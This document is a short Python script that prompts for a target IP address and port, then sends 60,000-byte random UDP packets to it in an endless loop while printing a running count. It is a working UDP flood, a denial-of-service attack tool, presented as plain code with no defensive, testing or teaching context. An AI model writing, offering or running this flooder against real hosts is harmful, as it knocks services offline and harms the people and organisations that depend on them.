import socket
import random

#by = random._urandom(60000)
# This is a UDP packet 
by = random._urandom(60000)

# Resolve the IP address from the domain name
ip_address = input("Enter IP address:")
port = int(input("Port:"))
try:
    ip_address = socket.gethostbyname(ip_address)
except socket.gaierror as e:
    print(f"Error resolving IP address: {e}")
    exit()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sent = 0

while True:
    sock.sendto(by, (ip_address, port))
    sent += 1
    print("Sent %s amount of packets to %s at port %s." % (sent, ip_address, port))